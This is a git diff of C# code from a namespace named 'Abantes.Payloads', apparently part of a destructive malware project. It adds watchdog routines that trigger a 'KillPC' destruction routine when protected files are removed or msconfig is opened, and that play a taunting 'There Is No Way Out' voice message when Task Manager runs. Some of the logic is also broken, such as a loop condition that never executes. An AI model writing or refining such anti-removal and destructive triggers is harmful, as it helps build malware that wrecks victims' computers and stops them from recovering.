@@ -250,36 +250,47 @@ namespace Abantes.Payloads
     }
     class WatchDog
     {
-        public static void Rules(string sProcessName)
+        public static void FileWatchDog(string[] sFileName)
         {
-            Process[] proc = Process.GetProcessesByName(sProcessName);
-            if (proc.Length > 0)
-            {
+            //Put each files path in an array to check if it exists
 
-            }
-            else
+            for (int i = 0; i > sFileName.Count();i++)
             {
-                Destructive.KillPC();
+                if (File.Exists(sFileName[i]) == false)
+                {
+                    Destructive.KillPC();
+                }
             }
         }
-        public static void msconfig(string sProcessName)
+        public static void ApplicationWatchDog(string[] sProcessName)
         {
-            Process[] proc = Process.GetProcessesByName(sProcessName);
-            if (proc.Length > 0)
+            //Put each process to watch for in an array to check if it exists
+            
+            for (int i = 0; i < sProcessName.Count(); i++)
             {
-                Destructive.KillPC();
+                
+                Process[] proc = Process.GetProcessesByName(sProcessName[i]);
+                if (proc.Length > 0)
+                {
+                    
+                    if (proc[0].ToString() == Process.GetProcessesByName("taskmgr")[0].ToString())
+                    {
+                        SpeechSynthesizer TTS = new SpeechSynthesizer();
+                        TTS.SetOutputToDefaultAudioDevice();
+                        TTS.Volume = 100;
+                        TTS.Speak("There Is No Way Out");
+                    }
+                    else if (proc[0].ToString() == Process.GetProcessesByName("msconfig")[0].ToString())
+                    {
+                        Destructive.KillPC();
+                    }
+                    else
+                    {
+                        //Non-Flagged Process found
+                    }
+                }
             }
         }
-        public static void TaskMGR(string sProcessName)
-        {
-            Process[] proc = Process.GetProcessesByName(sProcessName);
-            if (proc.Length > 0)
-            {
-                SpeechSynthesizer TTS = new SpeechSynthesizer();
-                TTS.SetOutputToDefaultAudioDevice();
-                TTS.Volume = 100;
-                TTS.Speak("There Is No Way Out");
-            }
-        }
+
     }
 }
